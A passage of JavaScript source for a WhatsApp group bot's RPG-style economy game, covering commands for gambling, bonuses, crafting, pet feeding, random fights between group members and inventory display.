        if (Bot < Kamu) {
            user[type] += count * 1
            status = 'Win'
        } else if (Bot > Kamu) {
            user[type] -= count * 1
        } else {
            status = 'Series'
            user[type] += (Math.floor(count / 1.5)) * 1
        }
        replydare(`
| *PLAYERS* | *POINT* |
*🤖 BOT:*      ${Bot}
*🙂 YOU:*    ${Kamu}

You *${status}*, you ${status == 'Win' ? `Get *+${count * 2}*`: status == 'Lost' ? `Lost *-${count * 1}*`: `Get *+${Math.floor(count / 1.5)}*`} *${type} ${global.rpg.emoticon(type)}*
`.trim())
    } catch (e) {
        if (moneyDulu > (user[type] * 1)) user[type] = moneyDulu * 1
        replydare('Error when gambling (Rejected)')
    }
}
break
//==================================================================
case 'claim':
case 'bonus': {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
    let user = global.db.users[m.sender]
    let time = user.lastbonus + 86400000
    if (new Date - user.lastbonus < 86400000) return replydare(`You Have Taken Your Bonus Today\nWait for ${msToTime(time - new Date())} Again`)
    let money = Math.floor(Math.random() * 50000000)
    user.money += money * 1
    user.lastbonus = new Date * 1
    replydare(`Congratulations on getting the bonus : \n+${money} Money`)
}
break
//==================================================================
case 'buah':
case 'fruit': {
  if (!m.isGroup) return reply(mess.only.group)
	let user = global.db.users[m.sender]
	let ini_txt = `[ *YOUR FRUIT WAREHOUSE* ]\n\n`
	ini_txt += `🍌 ${user.pisang} Banana\n`
	ini_txt += `🍇 ${user.anggur} Wine\n`
	ini_txt += `🥭 ${user.mangga} Mango\n`
	ini_txt += `🍊 ${user.jeruk} Orange\n`
	ini_txt += `🍎 ${user.apel} Apple\n\n`
	ini_txt += `Use the command *fruit sell* to sell.`
	replydare(`${ini_txt}`)
}
break
//==================================================================
case 'bunuh':
case 'kill': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
        let h = Math.floor(ms / 3600000)
        let m = Math.floor(ms / 60000) % 60
        let s = Math.floor(ms / 1000) % 60
        return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = Dare.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
	let kerja = 'Bunuh'
    Dare.misi = Dare.misi ? Dare.misi : {}
    if (id in Dare.misi) {
        replydare(`Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🕵️ Getting Target.....
`.trim()

        var dimas2 = `
⚔️ Piercing His Body.....
`.trim()

        var dimas3 = `
☠️ Target dies\nAnd you take his things
`.trim()

        var dimas4 = `
💼 The result of killing....
`.trim()

        var hsl = `
*—[ Yield ${name} ]—*
➕ 🙂 Money = [ ${rbrb4} ]
➕ 🙂 Exp = [ ${rbrb5} ]
➕ 👮 Offense +1
➕ ☑️ Mission Successful = +1
➕  📥Total Previous Missions: ${order}
`.trim()

		user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1
        user.warn += 1

		Dare.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete Dare.misi[id]
        }, 27000)
    	]
        setTimeout(() => {
            replydare(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replydare(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replydare(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replydare(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replydare(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replydare('🔍Looking for assassination targets.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replydare(`Please wait for ${timers}, to complete the mission again`)
}
break
//==================================================================
case 'collect': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastclaim)
    let _timers = (43200000 - __timers)
    let timers = clockString(_timers) 
    let user = global.db.users[m.sender]
    if (new Date - global.db.users[m.sender].lastclaim > 43200000) {
        replydare(`You have claimed and Get *1000* 💵money and *1* 🥤potion`)
        user.money += 1000
        user.potion += 1
        user.lastclaim = new Date * 1
    } else replydare(`Please wait *${timers}* again to be able to claim again`)
}
break

//==================================================================
case 'craft':
case 'crafting': {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  let { stock } = global.db.settings[botNumber]

  let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Use Formats *${command} [type]*
example *${command} pickaxe*

*乂 List of Things That Can Be Crafted*
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼
▧ Atm 💳

*乂 Recipe*
▧ Pickaxe ⛏️
〉 10 Kayu
〉 5 Batu
〉 5 Iron
〉 20 String

▧ Sword ⚔️
〉 10 Kayu
〉 15 Iron

▧ Fishingrod 🎣
〉 10 Kayu
〉 2 Iron
〉 20 String

▧ Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

▧ Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`
  try {
    if (/craft|Crafting/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxe > 0) return replydare('You already have this')
            if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return replydare(`Not enough goods!\nTo make pickaxe. You need : ${user.wood < 10 ? `\n${10 - user.wood} wood  ` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Stone   ` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 5
            stock.iron += 5
        
            user.rock -= 5
            stock.rock += 5

            user.string -= 20
            stock.string += 20

            user.pickaxe += 1
            user.pickaxedurability = 40
            replydare("Successful creation 1 pickaxe 🔨")
            break
          case 'sword':
          if (user.sword > 0) return replydare('You already have this')
            if(user.wood < 10 || user.iron < 15) return replydare(`Not enough goods!\nTo make swords. You need :${user.wood < 10 ? `\n${10 - user.wood} wood  ` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 15
            stock.iron += 15

            user.sword += 1
            user.sworddurability = 40
            replydare("Successful creation 1 sword 🗡️")
            break
          case 'fishingrod':
          if (user.fishingrod > 0) return replydare('You already have this')
            if(user.wood < 20 || user.iron < 5 || user.string < 20) return replydare(`Not enough goods!\nTo use fishing rods. You need :${user.wood < 20 ? `\n${20 - user.wood} wood  ` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 2
            stock.iron +=2

            user.string -= 20
            stock.string += 20

            user.fishingrod += 1
            user.fishingroddurability = 40
            replydare("Successful creation 1 Fishing rod 🎣")
            break
          case 'armor':
          if (user.armor > 0) return replydare('You already have this')
            if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return replydare(`Not enough goods!\nTo make armor. You need :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 1
            stock.emerald += 1

            user.iron -= 30
            stock.iron += 30

            user.diamond -= 5
            stock.diamond += 5

            user.armor += 1
            user.armordurability = 50
            replydare("Successful creation 1 Armor 🥼")
            break
            case 'atm':
          if (user.atm > 0) return replydare('You already have this')
            if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return replydare(`Not enough goods!\nTo make atm. You need :${user.money < 10000 ? `\n${10000 - user.money} Money 🙂` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 3
            stock.emerald += 3

            user.diamond -= 6
            stock.diamond += 6

            user.money -= 10000
            user.atm += 1
            user.fullatm = 500000000
            replydare("Successful creation 1 Atm 💳")
            break
          default:
            return await replydare(`${caption}`)
        }
    } 
  } catch (err) {
    replydare("Error\n\n\n" + err.stack)
  }
}
break
//==================================================================
case 'feed': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = isNaN(ms) ? '--' : Math.floor(ms / 310000)
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [h, ' H ', m, ' M ', s, ' S'].map(v => v.toString().padStart(2, 0)).join('')
}
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}

	let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Example:* ${command}fcat
`.trim()
let pesan = pickRandom(['ɴʏᴜᴍᴍᴍ~', 'ᴛʜᴀɴᴋs', 'ᴛʜᴀɴᴋʏᴏᴜ ^-^', '...', 'ᴛʜᴀɴᴋ ʏᴏᴜ~', 'ᴀʀɪɢᴀᴛᴏᴜ ^-^'])
    let type = (args[0] || '').toLowerCase()
    let emo = (type == 'fox' ? '🦊':'' || type == 'cat' ? '🐈':'' || type == 'dog' ? '🐕':'' || type == 'horse' ? '🐴':'' || type == 'robo'? '🤖':'' ) 
    let user = global.db.users[m.sender]
    let rubah = global.db.users[m.sender].fox
    let kuda = global.db.users[m.sender].horse
    let kucing = global.db.users[m.sender].cat
    let anjing = global.db.users[m.sender].dog
    let robot = global.db.users[m.sender].robo
    switch (type) {
        case 'fox':
            if (rubah == 0) return replydare('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (rubah == 10) return replydare('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktur = (new Date - user.foxlastfeed)
            let _waktur = (10000 - __waktur)
            let waktur = clockString(_waktur)
            if (new Date - user.foxlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.foxexp += 20
                    user.foxlastfeed = new Date * 1
                    replydare(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (rubah > 0) {
                        let naiklvl = ((rubah * 100) - 1)
                        if (user.foxexp > naiklvl) {
                            user.fox += 1
                            user.foxexp -= (rubah * 100)
                            replydare(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
            break
        case 'cat':
            if (kucing == 0) return replydare('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kucing == 10) return replydare('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuc = (new Date - user.catlastfeed)
            let _waktuc = (10000 - __waktuc)
            let waktuc = clockString(_waktuc)
            if (new Date - user.catlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.catexp += 20
                    user.catlastfeed = new Date * 1
                    replydare(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
            
                    if (kucing > 0) {
                        let naiklvl = ((kucing * 100) - 1)
                        if (user.catexp > naiklvl) {
                            user.cat += 1
                            user.catexp -= (kucing * 100)
                            replydare(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`)
            break
        case 'dog':
            if (anjing == 0) return replydare('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (anjing == 10) return replydare('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktua = (new Date - user.doglastfeed)
            let _waktua = (10000 - __waktua)
            let waktua = clockString(_waktua)
            if (new Date - user.doglastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.dogexp += 20
                    user.doglastfeed = new Date * 1
                    replydare(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (anjing > 0) {
                        let naiklvl = ((anjing * 100) - 1)
                        if (user.dogexp > naiklvl) {
                            user.dog += 1
                            user.dogexp -= (anjing * 100)
                            replydare(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`)
            break
        case 'horse':
            if (kuda == 0) return replydare('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kuda == 10) return replydare('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuk = (new Date - user.horselastfeed)
            let _waktuk = (10000 - __waktuk)
            let waktuk = clockString(_waktuk)
            if (new Date - user.horselastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.horseexp += 20
                    user.horselastfeed = new Date * 1
                    replydare(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (kuda > 0) {
                        let naiklvl = ((kuda * 100) - 1)
                        if (user.horseexp > naiklvl) {
                            user.horse += 1
                            user.horseexp -= (kuda * 100)
                            replydare(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`)
            break
            case 'robo':
            if (robot == 0) return replydare('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (robot == 10) return replydare('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __wakturb = (new Date - user.robolastfeed)
            let _wakturb = (10000 - __wakturb)
            let wakturb = clockString(_wakturb)
            if (new Date - user.robolastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.roboexp += 20
                    user.robolastfeed = new Date * 1
                    replydare(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (robot > 0) {
                        let naiklvl = ((robot * 100) - 1)
                        if (user.roboexp > naiklvl) {
                            user.robo += 1
                            user.roboexp -= (robot * 100)
                            replydare(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replydare(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`)
            break
        default:
            return replydare(`${info}`)
    }
}
break
//==================================================================
case 'fighting':
 case 'fight': {
   function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
   if (!m.isGroup) return reply(mess.only.group)
    Dare.fight = Dare.fight ? Dare.fight: {}
    let user = global.db.users[m.sender]
    if (typeof Dare.fight[m.sender] != "undefined" && Dare.fight[m.sender] == true) return replydare(`Kamu masih bertarung.`)
    let users = participants.map(a => a.id)
    var lawan
    lawan = users[Math.floor(users.length * Math.random())]
    while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender) {
        lawan = users[Math.floor(users.length * Math.random())]
    }
    replydare(`*Kamu* (level ${user.level}) menantang *${Dare.getName(lawan)}* (level ${global.db.users[lawan].level}) dan sedang dalam pertarungan.\n\nWait 5 more minutes and see who wins.`)
    Dare.fight[m.sender] = true
    await delay(300000)
    let kesempatan = []
    for (let i = 0; i < user.level; i++) kesempatan.push(m.sender)
    for (let i = 0; i < global.db.users[lawan].level; i++) kesempatan.push(lawan)
    let pointPemain = 0
    let pointLawan = 0
    for (let i = 0; i < 10; i++) {
        let unggul = getRandom(0, kesempatan.length - 1)
        if (kesempatan[unggul] == m.sender) pointPemain += 1
        else pointLawan += 1
    }
    if (pointPemain > pointLawan) {
        let hadiah = (pointPemain - pointLawan) * 10000
        user.money += hadiah
        user.limit += 1
        replydare(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Kamu* (level ${user.level}) WIN against *${Dare.getName(lawan)}* (level ${global.db.users[lawan].level}) karena you ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nGift . ${hadiah.toLocaleString()}\n+1 Limit`)
    } else if (pointPemain < pointLawan) {
        let denda = (pointLawan - pointPemain) * 100000
        user.money -= denda
        user.limit += 1
        replydare(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Kamu* (level ${user.level}) LOSE the fight *${Dare.getName(lawan)}* (level ${global.db.users[lawan].level}) karena you ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nYour money berkurang ${denda.toLocaleString()}\n+1 Limit`)
    } else {
        replydare(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything`)
    }
    delete Dare.fight[m.sender]
}
break
//==================================================================
case 'gajian':
case 'payday': {
  if (!m.isGroup) return reply(mess.only.group)
function JaM(ms) {
  let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
  return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
  let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
  return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
  let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
  return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

  let LastClaim = global.db.users[m.sender].lastclaim
  let cdm = `${MeNit(new Date - LastClaim)}`
  let cds = `${DeTik(new Date - LastClaim)}`
  let cd1 = Math.ceil(44 - cdm)
  let cd2 = Math.ceil(59 - cds)
  if (new Date - global.db.users[m.sender].lastclaim > 2700000) {
    global.db.users[m.sender].money += 50000
    global.db.users[m.sender].exp += 100
    replydare('Nih gaji lu +Rp50000')
    global.db.users[m.sender].lastclaim = new Date * 1
  } else return replydare(`Lu udah ambil jatah hari ini.\n\nWait ${cd1} Menit ${cd2} Detik!`)
}
break
//==================================================================
case 'me':
case 'inventory': {
  if (!m.isGroup) return reply(mess.only.group)
let inventory = {
  others: {
    joinlimit: true,
    health: true,
    money: true,
    chip: true,
    exp: true,
  },
  items: {
    GrapeSeeds: true,
    MangoSeeds: true,
    BananaSeeds: true,
    AppleSeeds: true,
    OrangeSeeds: true,
    Wine: true,
    Mango: true,
    Banana: true,
    Apple: true,
    Orange: true,
    potion: true,
    trash: true,
    wood: true,
    rock: true,
    string: true,
    emerald: true,
    diamond: true,
    gold: true,
    iron: true,
    umpan: true,
    upgrader: true,
    pet: true,
    petfood: true,
  },
  durabi: {
    sworddurability: true,
    pickaxedurability: true,
    fishingroddurability: true,
    armordurability: true,
  },
  tools: {
    armor: {
      '0': '❌',
      '1': 'Leather Armor',
      '2': 'Iron Armor',
      '3': 'Gold Armor',
      '4': 'Diamond Armor',
      '5': 'Emerald Armor',
      '6': 'Crystal Armor',
      '7': 'Obsidian Armor',
      '8': 'Netherite Armor',
      '9': 'Wither Armor',
      '10': 'Dragon Armor',
      '11': 'Hacker Armor'
    },
    sword: {
      '0': '❌',
      '1': 'Wooden Sword',
      '2': 'Stone Sword',
      '3': 'Iron Sword',
      '4': 'Gold Sword',
      '5': 'Copper Sword',
      '6': 'Diamond Sword',
      '7': 'Emerald Sword',
      '8': 'Obsidian Sword',
      '9': 'Netherite Sword',
      '10': 'Samurai Slayer Green Sword',
      '11': 'Hacker Sword'
    },
    pickaxe: {
      '0': '❌',
      '1': 'Wooden Pickaxe',
      '2': 'Stone Pickaxe',
      '3': 'Iron Pickaxe',
      '4': 'Gold Pickaxe',
      '5': 'Copper Pickaxe',
      '6': 'Diamond Pickaxe',
      '7': 'Emerlad Pickaxe',
      '8': 'Crystal Pickaxe',
      '9': 'Obsidian Pickaxe',
      '10': 'Netherite Pickaxe',
      '11': 'Hacker Pickaxe'
    },
    fishingrod: {
      '0': '❌',
      '1': 'Wooden Fishingrod',
      '2': 'Stone Fishingrod',
      '3': 'Iron Fishingrod',
      '4': 'Gold Fishingrod',
      '5': 'Copper Fishingrod',
      '6': 'Diamond Fishingrod',
      '7': 'Emerald Fishingrod',
      '8': 'Crystal Fishingrod',
      '9': 'Obsidian Fishingrod',
      '10': 'God Fishingrod',
      '11': 'Hacker Fishingrod'
     }
  },
  crates: {
    common: true,
    uncommon: true,
    mythic: true,
    legendary: true,
  },
  pets: {
    horse: 10,
    cat: 10,
    fox: 10,
    dog: 10,
    robo: 10,
  },
  cooldowns: {}
}

  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Dare.user.jid : m.sender
  let user = global.db.users[who]

  if (!(who in global.db.users)) return replydare(`User ${who} not in database`)

  let sortedlevel = Object.entries(global.db.users).sort((a, b) => b[1].level - a[1].level)
  let userslevel = sortedlevel.map(v => v[0])
  let sortedchip = Object.entries(global.db.users).sort((a, b) => b[1].chip - a[1].chip)
  let userschip = sortedchip.map(v => v[0])
  let sortedmoney = Object.entries(global.db.users).sort((a, b) => b[1].money - a[1].money)
  let usersmoney = sortedmoney.map(v => v[0])
  let sorteddiamond = Object.entries(global.db.users).sort((a, b) => b[1].diamond - a[1].diamond)
  let usersdiamond = sorteddiamond.map(v => v[0])
  let sortedbank = Object.entries(global.db.users).sort((a, b) => b[1].bank - a[1].bank)
  let usersbank = sortedbank.map(v => v[0])
  let sortedgold = Object.entries(global.db.users).sort((a, b) => b[1].gold - a[1].gold)
  let usersgold = sortedgold.map(v => v[0])

  let isMods = [Dare.decodeJid(Dare.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let DareTheCreator = m.fromMe || isMods || [Dare.decodeJid(Dare.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let isPrems =  DareTheCreator || new Date() - user.premiumTime < 0

  let limit = isPrems ? 'Unlimited' : user.limit
  let tools = Object.keys(inventory.tools).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${typeof inventory.tools[v] === 'object' ? inventory.tools[v][user[v]?.toString()] : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let items = Object.keys(inventory.items).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let dura = Object.keys(inventory.durabi).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let crates = Object.keys(inventory.crates).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let pets = Object.keys(inventory.pets).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v] >= inventory.pets[v] ? 'Max Levels' : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let cooldowns = Object.entries(inventory.cooldowns).map(([cd, { name, time }]) => cd in user && `*✧ ${name}*: ${new Date() - user[cd] >= time ? '🙂' : '❌'}`).filter(v => v).join('\n').trim()

  let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : Dare.getName(who)}* ${user.level ? `
➠ ${global.rpg.emoticon('level')} level: ${user.level}` : ''} ${user.limit ? `
➠ ${global.rpg.emoticon('limit')} limit: ${limit}` : ''}
${Object.keys(inventory.others).map(v => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`).filter(v => v).join('\n')} ${tools ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}` : ''}${items ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}` : ''}${crates ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}` : ''}${pets ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}` : ''}${cooldowns ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon('chip')} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${userschip.length}*
${global.rpg.emoticon('money')} ᴛᴏᴘ ᴍᴏɴᴇʏ *${usersmoney.indexOf(who) + 1}* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon('bank')} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${usersbank.length}*
${global.rpg.emoticon('level')} ᴛᴏᴘ ʟᴇᴠᴇʟ *${userslevel.indexOf(who) + 1}* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon('diamond')} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${usersdiamond.indexOf(who) + 1}* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon('gold')} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${usersgold.length}*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}` : ''}
*✧ dungeon: ${user.lastdungeon == 0 ? '🙂': '❌'}*
*✧ mining: ${user.lastmining == 0 ? '🙂': '❌'}*
`.trim()

    replydare(`${caption}`)
}
break
//==================================================================
case 'upgrade': {
  if (!m.isGroup) return reply(mess.only.group)
        let user = global.db.users[m.sender]
        let wood = user.wood * 1
        let rock = user.rock * 1
        let string = user.string * 1
        let money = user.money * 1
        let iron = user.iron * 1
        let fishingrod = user.fishingrod * 1
        let pickaxe = user.pickaxe * 1
        let sword = user.sword * 1
        let diamond = user.diamond * 1
        let emerald = user.emerald * 1
        let armor = user.armor * 1
        let atm = user.atm
        let type = (args[0] || '').toLowerCase()
        let prefix = command
        
        let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
